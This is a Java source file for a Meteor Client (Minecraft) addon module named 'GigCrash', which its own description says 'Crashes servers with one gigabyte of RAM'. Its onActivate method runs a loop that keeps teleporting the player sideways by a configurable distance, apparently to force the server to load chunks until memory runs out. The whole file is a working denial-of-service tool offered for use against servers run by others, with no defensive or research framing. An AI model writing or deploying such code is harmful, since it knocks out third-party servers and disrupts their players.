package com.example.addon.modules;


import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;

public class GigCrash extends Module {
    Thread thr;
    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    private final Setting<Integer> range = sgGeneral.add(new IntSetting.Builder()
        .name("range")       // name in GUI
        .description("How far") // tooltip
        .defaultValue(1)                // default value
        .min(0)                         // minimum slider value
        .max((int) Double.POSITIVE_INFINITY)                       // maximum slider value
        .sliderMax(1000)                 // slider drag limit
        .build()
    );
    private final Setting<Integer> time = sgGeneral.add(new IntSetting.Builder()
        .name("time")       // name in GUI
        .description("How much ms") // tooltip
        .defaultValue(1)                // default value
        .min(0)                         // minimum slider value
        .max((int) Double.POSITIVE_INFINITY)                       // maximum slider value
        .sliderMax(1000)                 // slider drag limit
        .build()
    );
    private final Setting<Boolean> yesno = sgGeneral.add(new BoolSetting.Builder()
        .name("move-the-y-axis")       // name in GUI
        .description("I dont think you need a description for this") // tooltip         // slider drag limit
        .build()
    );
    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("time")       // name in GUI
        .description("How much ms") // tooltip
        .defaultValue(200)                // default value
        .min(-100)                         // minimum slider value
        .max(300)                       // maximum slider value
        .sliderMax(300)                 // slider drag limit
        .build()
    );
    public GigCrash() {
        super(AddonTemplate.CATEGORY, "1g-crash", "Crashes servers with one gigabyte of RAM (thanks olafcio!)");
    }

    @Override
    public void onActivate() {
        thr = new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(time.get());
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
                assert mc.player != null;
                double cx = mc.player.getX();
                double cy = mc.player.getY();
                double cz = mc.player.getZ();
                mc.player.setVelocity(0,0,0);

                if (yesno.get() == true) {
                    mc.player.setPos(cx + range.get(), amount.get(), cz);
                } else {
                    mc.player.setPos(cx + range.get(), cy, cz);
                }
                if (Thread.currentThread().isInterrupted()) {
                    break;
                }
            }


        });
        thr.start();
    }
    @Override
    public void onDeactivate() {
        thr.interrupt();
    }

}
